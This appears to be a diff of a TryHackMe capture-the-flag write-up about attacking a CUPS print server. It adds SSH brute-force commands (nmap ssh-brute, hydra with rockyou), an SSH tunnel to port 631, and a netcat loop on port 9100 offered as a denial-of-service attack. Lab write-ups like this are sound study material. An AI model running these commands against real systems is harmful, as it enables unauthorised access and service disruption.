@@ -35,25 +35,35 @@ CUPS open source print server uses IPP protocol for print management
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ceb437d5-2046-4d3a-b664-2e1dbef73359)
 
+In tab printers, you can see list of printers
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bed88e27-a1f8-47a8-a1f6-7ed5f181e2b5)
+
+click on that printer, you can see size of a test sheet
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/db0e3d0e-d134-4f29-87a2-65fa402a2f37)
+
 ## Exploitation
 
-using hydra to crack the ssh password of printer
+brute force the password using nmap to know username `printer` and hydra to `password`
 
 ```
+nmap 10.10.103.120 -p 22 --script ssh-brute --script-args userdb=user.txt
 hydra -l printer -P /usr/share/wordlists/rockyou.txt ssh://10.10.103.120
 ```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60aebfaf-7e93-46b6-8034-56365364c24f)
 
-.
+then connect ssh to machine through a tunnel
 
-| Flag | user.txt |
-| --- | --- |
-| Answer | <flag> |
+```
+ssh printer@10.10.230.19 -T -L 3631:localhost:631
+```
 
-## Privilege Escalation
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/04b2a52d-bb25-4e15-99e8-8f485d0732bd)
 
-.
+now you can using cheatsheet to do a ddos attack or whatever you want
 
-| Flag | root.txt |
-| --- | --- |
-| Answer | <flag> |
+```
+while true; do nc printer 9100; done
+```
